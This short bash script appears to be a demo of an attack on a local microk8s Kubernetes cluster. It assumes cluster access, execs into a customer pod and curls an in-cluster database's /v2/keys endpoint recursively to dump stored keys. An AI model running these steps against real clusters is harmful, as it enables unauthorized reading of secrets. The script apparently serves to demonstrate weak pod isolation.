#!/bin/bash

set -e

microk8sip=$(multipass list | grep microk8s-vm | awk '{print $3}')
customerpod=$(kubectl --kubeconfig=kubeconfig get pods | grep customer | awk '{print $1}')

echo
echo "=== Let's see if the application is up ==="
echo
curl $microk8sip:31000

echo
echo "=== Somehow we have gained access to the cluster! Let's go into the customer pod ==="
echo
kubectl --kubeconfig=kubeconfig exec -it $customerpod -- curl -v database/v2/keys

echo
echo "=== Let's dig deeper ==="
echo
kubectl --kubeconfig=kubeconfig exec -it $customerpod -- curl -v database/v2/keys?recursive=true